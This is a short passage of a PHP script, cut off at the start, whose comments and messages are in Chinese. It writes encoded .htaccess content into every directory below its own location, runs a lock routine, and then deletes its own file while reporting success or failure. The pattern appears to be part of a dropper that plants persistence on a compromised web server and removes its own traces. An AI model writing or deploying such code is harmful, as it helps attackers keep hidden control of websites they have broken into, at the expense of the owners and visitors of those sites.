ZNb2R1bGU+");
		$dir_array = array();
		searchDir(dirname(__FILE__), $htcontent, $dir_array);
		return count($dir_array);
	}
	
	writeHtaccessToAllDirs();
	
	if(functionCheck() !== false){
		lock($jsd_flag);
	}
	if(file_exists($file_self)){
		if(!unlink($file_self)){
			echo "$file_self 删除失败！<br/>";
		}else{
			echo "$file_self 删除成功！<br/>";
		}
	}
